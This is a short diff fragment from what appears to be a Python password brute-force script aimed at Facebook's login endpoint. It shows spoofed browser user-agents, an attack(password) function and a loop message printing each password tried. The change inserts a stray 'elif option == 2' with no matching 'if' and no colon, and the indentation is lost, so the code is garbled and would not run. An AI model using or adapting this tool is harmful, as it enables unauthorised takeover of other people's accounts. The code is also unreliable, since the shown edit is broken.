@@ -42,7 +42,7 @@ useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 def attack(password):
-
+elif option == 2
 try:
 sys.stdout.write("\r[*] trying %s.. " % password)
 sys.stdout.flush()
